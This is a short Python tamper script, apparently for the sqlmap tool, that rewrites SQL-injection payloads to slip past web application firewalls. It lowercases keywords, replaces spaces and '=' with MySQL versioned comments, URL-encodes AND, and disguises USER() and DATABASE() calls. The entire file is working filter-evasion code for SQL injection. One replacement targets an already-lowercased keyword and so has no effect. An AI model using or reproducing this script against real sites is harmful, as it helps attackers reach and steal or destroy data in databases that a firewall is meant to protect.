#!/usr/bin/env python
def dependencies():
    pass
def tamper(payload, **kwargs):
    if payload:
        payload=payload.replace("EXEC","exec")
        payload=payload.replace("DROP","drop")
        payload=payload.replace("SELECT","select")
        payload=payload.replace("CREATE","create")
        payload=payload.replace("DELETE","delete")
        payload=payload.replace(" ","/*!90000aaa*/")
        payload=payload.replace("AND","%26%26")
        payload=payload.replace("=","/*!90000aaa*/=/*!90000aaa*/")
        payload=payload.replace("UNION","UNION/*!90000aaa*/")
        payload=payload.replace("#","/*!90000aaa*/%23")
        payload=payload.replace("USER()","USER/*!()*/")
        payload=payload.replace("DATABASE()","DATABASE/*!()*/")
        payload=payload.replace("--","/*!90000aaa*/--")
        payload=payload.replace("SELECT","/*!90000aaa*/SELECT")
        payload=payload.replace("FROM","/*!90000aaa*//*!90000aaa*/FROM")
    return payload